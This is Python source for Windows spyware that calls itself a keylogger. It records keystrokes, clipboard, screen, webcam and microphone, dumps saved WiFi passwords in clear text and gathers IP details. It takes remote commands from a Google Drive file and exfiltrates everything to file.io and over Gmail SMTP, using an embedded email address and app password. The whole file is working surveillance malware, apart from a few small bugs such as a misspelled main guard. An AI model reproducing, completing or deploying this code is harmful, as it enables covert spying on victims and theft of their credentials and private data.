import os
import logging
import time
import threading
import wave
import pyperclip
import pyautogui
import cv2
import numpy as np
import requests
from datetime import datetime
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import sounddevice as sd
from scipy.io.wavfile import write
import subprocess
import socket
import winreg as reg
import sys
import shutil
import ctypes

# Logging configuration
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
logging.basicConfig(
    filename=os.path.join(LOG_DIR, "keylog.txt"),
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s",
)

# Google Drive Public URL for command.txt (Replace with your public file URL)
COMMAND_FILE_URL = "https://drive.google.com/uc?export=download&id=1wLxOpmHKwZOLq4iDBLIAG5L-mpTV-1BQ"  # Replace with your public file URL

# Function to lock the screen using Windows API
def lock_screen():
    ctypes.windll.user32.LockWorkStation()
    logging.info("Screen locked!")

# Function to check for commands in the Google Drive file (checking for lock_screen)
def check_commands_from_drive():
    while True:
        try:
            # Download the command.txt file using the public URL
            response = requests.get(COMMAND_FILE_URL)
            
            # If the request is successful
            if response.status_code == 200:
                command_content = response.text.strip()
                
                if command_content.lower() == "stop":
                    logging.info("Stop command received. Terminating keylogger.")
                    upload_files_to_fileio()  # Upload video files to File.io before stopping
                    os._exit(0)  # Terminate the program immediately

                elif command_content.lower() == "start_front_camera":
                    logging.info("Front camera start command received. Starting front camera recording.")
                    threading.Thread(target=record_front_camera, daemon=True).start()  # Start the front camera recording

                elif command_content.lower() == "lock_screen":
                    logging.info("Lock screen command received.")
                    lock_screen()

        except requests.exceptions.RequestException as e:
            logging.error(f"Error fetching file from Google Drive: {e}")
        
        time.sleep(2)  # Check every 5 seconds


def get_system_info():
    try:
        # Get the machine's hostname
        hostname = socket.gethostname()

        # Get the private IP address (local IP)
        private_ip = socket.gethostbyname(hostname)

        # Get the public IP address using an external service
        public_ip = requests.get("https://api.ipify.org").text

        # Save the information to a file
        system_info_path = os.path.join(LOG_DIR, "system_info.txt")
        with open(system_info_path, "w") as f:
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Private IP Address: {private_ip}\n")
            f.write(f"Public IP Address: {public_ip}\n")

        logging.info(f"System information saved to {system_info_path}")
        return system_info_path
    except Exception as e:
        logging.error(f"Error fetching system info: {e}")
        return None

def get_wifi_credentials():
    try:
        logging.info("Fetching WiFi profiles...")
        result = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True,
            text=True,
            shell=True,
        )
        profiles_output = result.stdout
        profiles = [
            line.split(":")[1].strip()
            for line in profiles_output.splitlines()
            if "All User Profile" in line
        ]
        wifi_credentials = []
        for profile in profiles:
            result = subprocess.run(
                ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                capture_output=True,
                text=True,
                shell=True,
            )
            profile_output = result.stdout
            password = None
            for line in profile_output.splitlines():
                if "Key Content" in line:
                    password = line.split(":")[1].strip()
            wifi_credentials.append({"SSID": profile, "Password": password or "None"})
        wifi_log_path = os.path.join(LOG_DIR, "wifi_credentials.txt")
        with open(wifi_log_path, "w") as f:
            for wifi in wifi_credentials:
                f.write(f"SSID: {wifi['SSID']}, Password: {wifi['Password']}\n")
        logging.info(f"WiFi credentials saved to {wifi_log_path}")
        return wifi_log_path
    except Exception as e:
        logging.error(f"Error fetching WiFi credentials: {e}")
        return None


# Function to log keystrokes
def log_keystrokes():
    def on_press(key):
        try:
            logging.info(str(key.char) if hasattr(key, 'char') and key.char else f"[{key}]")
        except Exception as e:
            logging.error(f"Error logging key: {e}")
    with Listener(on_press=on_press) as listener:
        listener.join()

# Function to log clipboard data
def log_clipboard():
    last_clipboard = ""
    while True:
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard != last_clipboard:
                last_clipboard = current_clipboard
                with open(os.path.join(LOG_DIR, "clipboard.txt"), "a") as f:
                    f.write(f"{datetime.now()}: {current_clipboard}\n")
        except Exception as e:
            logging.error(f"Error logging clipboard: {e}")
        time.sleep(5)

# Function to record screen continuously
def record_screen():
    screen_width = pyautogui.size().width
    screen_height = pyautogui.size().height
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    video_path = os.path.join(LOG_DIR, "screen_recording.avi")
    video_writer = cv2.VideoWriter(video_path, fourcc, 20.0, (screen_width, screen_height))
    
    frame_rate = 1 / 20.0  # 20 fps (you can change this value based on your needs)
    
    while True:
        start_time = time.time()  # Record the time at the start of each frame
        
        try:
            screenshot = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
            video_writer.write(frame)
            
        except Exception as e:
            logging.error(f"Error recording screen: {e}")
        
        # Ensure each frame takes the correct amount of time
        elapsed_time = time.time() - start_time
        time_to_wait = frame_rate - elapsed_time
        
        if time_to_wait > 0:
            time.sleep(time_to_wait)  # Sleep to control frame rate

    video_writer.release()

# Function to record front camera
def record_front_camera():
    # Try different camera indices
    cap = cv2.VideoCapture(0)  # Default camera (back camera)
    
    # You can loop through different indices like 1, 2, 3 to find the front camera
    if not cap.isOpened():
        cap = cv2.VideoCapture(1)  # Try front camera (or another index)

    if not cap.isOpened():
        logging.error("Error: Could not open any camera.")
        return

    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    video_path = os.path.join(LOG_DIR, "front_camera_recording.avi")
    video_writer = cv2.VideoWriter(video_path, fourcc, 20.0, (640, 480))

    while True:
        ret, frame = cap.read()
        if not ret:
            logging.error("Error: Failed to capture frame from front camera.")
            break
        video_writer.write(frame)

    cap.release()
    video_writer.release()


# Function to record audio
# Function to record audio continuously
def record_audio():
    fs = 44100  # Sampling rate
    chunk_duration = 60  # Record audio in 60-second chunks
    audio_path = os.path.join(LOG_DIR, f"audio_recording_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.wav")
    
    try:
        logging.info(f"Recording audio to {audio_path}...")
        
        # Open the file for saving the audio data
        with wave.open(audio_path, 'wb') as wf:
            wf.setnchannels(2)  # Stereo audio
            wf.setsampwidth(2)  # Sample width in bytes
            wf.setframerate(fs)
            
            while True:  # Run the recording indefinitely
                # Record a chunk of audio
                recording = sd.rec(int(chunk_duration * fs), samplerate=fs, channels=2)
                sd.wait()  # Wait for the recording to complete
                
                # Write the recorded chunk to the file
                wf.writeframes(recording.tobytes())
                logging.info(f"Audio chunk saved to {audio_path}")
                
    except Exception as e:
        logging.error(f"Error recording audio: {e}")

# Function to upload files to File.io and send email
# Function to upload files to File.io and send email
def upload_files_to_fileio():
    try:
        file_links = []

        # Screen recording
        video_file_path = os.path.join(LOG_DIR, "screen_recording.avi")
        if os.path.exists(video_file_path):
            link = upload_to_fileio(video_file_path)
            file_links.append(link)

        # Front camera recording
        front_camera_path_file = os.path.join(LOG_DIR, "front_camera_recording.avi")
        if os.path.exists(front_camera_path_file):
            link = upload_to_fileio(front_camera_path_file)
            file_links.append(link)

        # Audio recording
        audio_file_path = os.path.join(LOG_DIR, f"audio_recording_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.wav")
        if os.path.exists(audio_file_path):
            link = upload_to_fileio(audio_file_path)
            file_links.append(link)

        # System info (this file is sent via email, not uploaded to File.io)
        system_info_path = get_system_info()
        if system_info_path:
            # Send WiFi credentials via email
            attach_file_to_email("system_info.txt", system_info_path)

        send_email(file_links)

    except Exception as e:
        logging.error(f"Error uploading files to File.io or sending email: {e}")


# Function to upload a file to File.io and return the download link
def upload_to_fileio(file_path):
    url = "https://file.io"
    with open(file_path, "rb") as file:
        files = {"file": file}
        response = requests.post(url, files=files)
        if response.status_code == 200:
            file_info = response.json()
            download_link = file_info.get("link")
            logging.info(f"File uploaded successfully! Download link: {download_link}")
            return download_link
        else:
            logging.error(f"Error uploading file {file_path} to File.io")
            return None



# Function to attach file directly to the email
def attach_file_to_email(filename, filepath):
    try:
        with open(filepath, "rb") as f:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename={filename}")
            return part
    except Exception as e:
        logging.error(f"Error attaching file {filename}: {e}")
        return None

# Function to send an email with the keylog.txt, clipboard.txt, and other links
# Function to send an email with the keylog.txt, clipboard.txt, and other links
def send_email(file_links):
    
    from_email = "shaiqhussain01@gmail.com"  # Replace with your email address
    to_email = "shaiqhussain01@gmail.com"  # Replace with the recipient email
    subject = "Keylogger Logs, WiFi Credentials, and File Links"

    # Create the email message
    msg = MIMEMultipart()
    msg["From"] = from_email
    msg["To"] = to_email
    msg["Subject"] = subject

    # Attach files
    attach_keylog = attach_file_to_email("keylog.txt", os.path.join(LOG_DIR, "keylog.txt"))
    attach_clipboard = attach_file_to_email("clipboard.txt", os.path.join(LOG_DIR, "clipboard.txt"))
    attach_wifi = attach_file_to_email("wifi_credentials.txt", os.path.join(LOG_DIR, "wifi_credentials.txt"))
    attach_system_info = attach_file_to_email("system_info.txt", get_system_info())  # Attach system info

    if attach_keylog:
        msg.attach(attach_keylog)
    if attach_clipboard:
        msg.attach(attach_clipboard)
    if attach_wifi:
        msg.attach(attach_wifi)
    if attach_system_info:
        msg.attach(attach_system_info)

    # Add the File.io links to the email body
    body = "The following are the download links for the uploaded files:\n\n"
    body += "\n".join(file_links)
    msg.attach(MIMEText(body, "plain"))

    # Connect to the email server and send the email
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(from_email, "bjnk saio vukk flny")  # Use the App Password here
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Error sending email: {e}")


# Main function that calls other functions to start the keylogger
def main():

    threading.Thread(target=log_keystrokes, daemon=True).start()
    threading.Thread(target=log_clipboard, daemon=True).start()
    threading.Thread(target=record_screen, daemon=True).start()
    get_wifi_credentials()  # Fetch WiFi credentials once at startup

    threading.Thread(target=check_commands_from_drive, daemon=True).start()  # Check for commands in command.txt

    while True:
        time.sleep(10)


if _name_ == "_main_":
    main()